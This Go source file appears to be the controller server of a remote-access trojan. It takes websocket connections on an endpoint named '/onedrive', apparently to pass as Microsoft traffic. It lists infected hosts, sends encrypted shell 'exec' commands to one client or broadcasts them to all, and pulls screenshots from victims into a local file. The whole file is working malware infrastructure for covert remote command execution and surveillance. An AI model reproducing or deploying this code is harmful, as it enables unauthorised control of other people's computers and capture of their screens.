package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"

	"github.com/ProtonMail/gopenpgp/v2/crypto"
	"github.com/ProtonMail/gopenpgp/v2/helper"
	"github.com/gorilla/websocket"

	Config "github.com/notcat/tcpsockettest/server/config"
	"github.com/spf13/viper"
)

// Client contains a "conn" (conn pointer), a "hostname" (hostname of machine), and a "pubkey" (clients pgp public key)
type Client struct {
	id       int
	conn     websocket.Conn
	hostname string
	pubKey   string
}

var (
	connNumber = 0
	clients    = make(map[int]Client)
)

// Message contains a command, ("exec", "screenshot", ...) and a string of arguments
type Message struct {
	Command string // type of execution
	Args    string
}

var upgrader = websocket.Upgrader{} // use default options for the websocket

func main() {
	Config.ExecuteConfig()

	viper.SetConfigName("serverconfig")
	viper.SetConfigType("toml")
	viper.AddConfigPath("./")

	if err := viper.ReadInConfig(); err != nil {
		if _, ok := err.(viper.ConfigFileNotFoundError); ok {
			fmt.Println("NOT FOUND")
		} else {
			// Config file was found but another error was produced
		}
	}

	ecPrivKey := viper.GetString("privateKey")

	// Write the default config if doesnt exist already
	// get the create a private key

	// Start server start in another gothread
	go startServer(ecPrivKey)

	// Take input from the console
	msgReader := bufio.NewReader(os.Stdin)

	// Loop during the main thread, waiting for input.
	for {
		input, _ := msgReader.ReadString('\n')
		input = strings.TrimSuffix(input, "\n") // Remove the newline
		input = strings.TrimSuffix(input, "\r") // fuck windows

		rcmd := strings.Fields(input)

		if len(rcmd) > 0 { // make sure not to panic because of index out of range if input is empty
			cmd := strings.TrimPrefix(rcmd[0], "/")

			if cmd == "broadcast" {
				input = strings.TrimPrefix(input, "/"+cmd+" ")

				broadcastMessage("exec", []byte(input), &clients)
			}
			if cmd == "exec" {
				clientid, err := strconv.Atoi(rcmd[1])
				if err != nil {
					log.Println("Must provide an integer for the second argument!")
					return
				}

				input = strings.TrimPrefix(input, "/"+cmd+" "+rcmd[1]+" ")

				sendMessage("exec", []byte(input), clients[clientid])
			}
			if cmd == "list" {
				input = strings.TrimPrefix(input, "/"+cmd+" ")

				for _, client := range clients {
					fmt.Println(client.id, client.hostname)
				}
			}
			if cmd == "screenshot" {
				input = strings.TrimPrefix(input, "/"+cmd+" ")

				clientid, err := strconv.Atoi(rcmd[1])
				if err != nil {
					log.Println("Must provide an integer for the second argument!")
					return
				}
				sendMessage("screenshot", nil, clients[clientid])
			}
		}
	}
}

func startServer(ecPrivKey string) {
	// Get config values from the viper confifg
	serverHost := viper.GetString("serverHost")
	serverPort := viper.GetString("serverPort")

	// Start the server
	log.Println("Starting websocket server on " + serverHost + ":" + serverPort)

	// listen for /onedrive websocket connections
	http.HandleFunc("/onedrive", func(w http.ResponseWriter, r *http.Request) {
		c, err := upgrader.Upgrade(w, r, nil)
		if err != nil {
			log.Print("upgrade:", err)
			return
		}

		// Makes a Private Key *crypto.Key from a Private Key string (ecPrivKeyString)
		ecPrivKey, err := crypto.NewKeyFromArmored(ecPrivKey)

		// Public key string to distribute to clients to encrypt their output they want to send back to me with
		// I only have the private key to decrypt the message they send to prevent MITM attacks
		ecPubKey, err := ecPrivKey.GetArmoredPublicKey()

		// send the client a public key for them to encrypt back to us with
		c.WriteMessage(websocket.TextMessage, []byte(ecPubKey))

		log.Println("Client number " + fmt.Sprint(connNumber) + ", ip: " + c.RemoteAddr().String() + " connected.")

		go initiateConnection(*c)

	})

	err := http.ListenAndServe(serverHost+":"+serverPort, nil)
	if err != nil {
		fmt.Println("Error listening:", err.Error())
		os.Exit(1)
	}

}

func initiateConnection(conn websocket.Conn) {
	// Get the public key
	_, bytes, err := conn.ReadMessage()
	if err != nil {
		conn.Close()
		log.Println("Client had issue connecting.")
		log.Println(err)
		return
	}

	ecPubKey, err := crypto.NewKeyFromArmored(string(bytes))
	if err != nil {
		conn.Close()
		log.Println("Client provided non-pgp key on first response, closing.")
		return
	}

	entity := ecPubKey.GetEntity() // Get the key entity

	// Add client to clients slice
	clients[connNumber] = Client{
		connNumber,
		conn,                                 // conn pointer
		entity.PrimaryIdentity().UserId.Name, // hostname in key
		string(bytes),                        // clients pgp public key
	}

	// Add incremental number to count clients
	connNumber = connNumber + 1

	// Once connected, handle the connection in a new gothread
	go handleConnection(&conn, &connNumber)
}

func sendMessage(command string, bytes []byte, client Client) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("Recovering from panic in sendMessage, error is: %v \n", r)
		}
	}()

	if client.hostname != (Client{}).hostname {
		log.Println("Sending to Client " + fmt.Sprint(clients[client.id].id))
	} else {
		log.Println("Client doesnt exist.")
		return
	}

	message := Message{
		Command: command,
		Args:    string(bytes),
	}

	jsonData, err := json.Marshal(message)
	if err != nil {
		fmt.Println(err.Error())
	}

	fmt.Println(string(jsonData))

	// Encrypt the message to send with the clients public key
	// jsonData is the message to send
	// Encrypt message using the ecPubKey (generated from the servers private key above)
	armor, err := helper.EncryptMessageArmored(client.pubKey, string(jsonData))
	if err != nil {
		fmt.Println(err.Error())
	}

	// Send the clients the encrypted, marshaled json
	err = client.conn.WriteMessage(websocket.TextMessage, append([]byte(armor), []byte("\r")...))
	if err != nil {
		log.Println("Error sending to client ", client.id)
		return
	}

	log.Println("Message sent to client ", client.id)
}

func broadcastMessage(command string, bytes []byte, clients *map[int]Client) {
	message := Message{
		Command: command,
		Args:    string(bytes),
	}

	jsonData, err := json.Marshal(message)
	if err != nil {
		fmt.Println(err.Error())
	}

	fmt.Println(string(jsonData))

	for i, client := range *clients {
		// Encrypt the message to send with the clients public key
		// jsonData is the message to send
		// Encrypt message using the ecPubKey (generated from the servers private key above)
		armor, err := helper.EncryptMessageArmored(client.pubKey, string(jsonData))
		if err != nil {
			fmt.Println(err.Error())
		}

		// Send the clients the encrypted, marshaled json
		client.conn.WriteMessage(websocket.TextMessage, append([]byte(armor), []byte("\r")...))
		log.Println("sent to client", i)
	}
}

func handleConnection(conn *websocket.Conn, id *int) {
	_, bytes, err := conn.ReadMessage()

	if err != nil {
		fmt.Println("Client left.")

		// remove from client map slice array bullshit
		delete(clients, *id-1)

		fmt.Println(*id)
		conn.Close()
		return
	}

	decrypted, err := helper.DecryptMessageArmored(viper.GetString("privateKey"), []byte(viper.GetString("keyPassphrase")), string(bytes))
	if err != nil {
		fmt.Println(err)
	}

	var message Message
	json.Unmarshal([]byte(decrypted), &message)

	if message.Command == "exec" {
		// Print the output of the client
		fmt.Println("Client message:", message.Args)
	}

	if message.Command == "screenshot" {
		if message.Args == "fail" {
			log.Println("Failed to screenshot from client " + fmt.Sprint(*id-1) + " (Probably no display.)") // id-1 because the array starts at 1 for some reason
			handleConnection(conn, id)
			return
		}

		log.Println("Recieved screenshot from client " + fmt.Sprint(*id-1))

		// decode the base64 because it fucked up shit
		decoded, err := base64.StdEncoding.DecodeString(message.Args)

		err = ioutil.WriteFile("screenie.png", decoded, 0755)
		if err != nil {
			fmt.Println(err)
		}
	}

	// Recursively call handleConnection to continually fetch the
	handleConnection(conn, id)
}

// removeClient removes a client from the client slice from the index given
func removeClient(s []websocket.Conn, index int) []websocket.Conn {
	return append(s[:index], s[index+1:]...)
}

// have another private key for sending commands from the webclient to the server
// bootstrap ui
